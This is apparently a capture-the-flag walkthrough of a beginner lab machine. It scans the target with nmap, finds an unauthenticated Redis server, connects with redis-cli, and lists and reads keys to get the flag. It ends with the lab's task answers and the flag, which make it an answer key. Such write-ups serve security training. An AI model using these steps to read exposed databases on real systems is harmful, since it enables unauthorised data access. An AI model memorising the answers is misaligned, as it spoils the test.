## Walkthrough

- Performed nmap scans. Didn't find anything in the default scan so had to go for a full port scan

```
┌─[birb@parrot]─[~]
└──╼ $nmap 10.129.253.223 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 18:04 IST
Nmap scan report for 10.129.253.223
Host is up (0.35s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 3305.97 seconds
```

- found a redis database service running

```
┌─[birb@parrot]─[~]
└──╼ $nmap 10.129.253.223 -sC -sV -p6379
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 18:41 IST
Nmap scan report for 10.129.253.223
Host is up (0.37s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds
```

- connected to the database

```
┌─[✗]─[birb@parrot]─[~]
└──╼ $redis-cli -h 10.129.253.223
10.129.253.223:6379>
```

- server info

```
┌─[✗]─[birb@parrot]─[~]
└──╼ $redis-cli -h 10.129.253.223
10.129.253.223:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:756
run_id:bde5828161c0f01017b772b269065d65973e282e
tcp_port:6379
uptime_in_seconds:4171
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:1252480
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6668288
used_memory_rss_human:6.36M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1514936
allocator_active:1875968
allocator_resident:13336576
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.24
allocator_frag_bytes:361032
allocator_rss_ratio:7.11
allocator_rss_bytes:11460608
rss_overhead_ratio:0.50
rss_overhead_bytes:-6668288
mem_fragmentation_ratio:8.16
mem_fragmentation_bytes:5850672
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1678970810
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:417792
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:17
total_commands_processed:29
instantaneous_ops_per_sec:0
total_net_input_bytes:758
total_net_output_bytes:53417
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:8
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:367
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:1b774966cb3e49d22907175cfdf04f877223bcbd
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:3.674139
used_cpu_user:3.894820
used_cpu_sys_children:0.000000
used_cpu_user_children:0.001903

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(0.53s)
```

- selected the cluster at index 0

```
10.129.253.223:6379> SELECT 0
OK
```

- listed all the keys

```
10.129.253.223:6379> KEYS *
1) "temp"
2) "numb"
3) "stor"
4) "flag"
```

- got the flag

```
10.129.253.223:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

ANOTHER METHOD

- listed all the keys of the database

```
┌─[birb@parrot]─[~]
└──╼ $redis-cli --scan -h 10.129.253.223
"temp"
"flag"
"numb"
"stor"
```

- got the flag

```
┌─[birb@parrot]─[~]
└──╼ $redis-cli -h 10.129.253.223 get flag
"03e1d2b376c37ab3f5319922053953eb"
```

## Tasks

**Which TCP port is open on the machine?**

=> 6379

**Which service is running on the port that is open on the machine?**

=> redis

**What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database**

=> In-memory Database

**Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.**

=> redis-cli

**Which flag is used with the Redis command-line utility to specify the hostname?**

=> -h

**Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?**

=> info

**What is the version of the Redis server being used on the target machine?**

=> 5.0.7

**Which command is used to select the desired database in Redis?**

=> select

**How many keys are present inside the database with index 0?**

=> 4

**Which command is used to obtain all the keys in a database?**

=> keys *

**Submit root flag**

=> 03e1d2b376c37ab3f5319922053953eb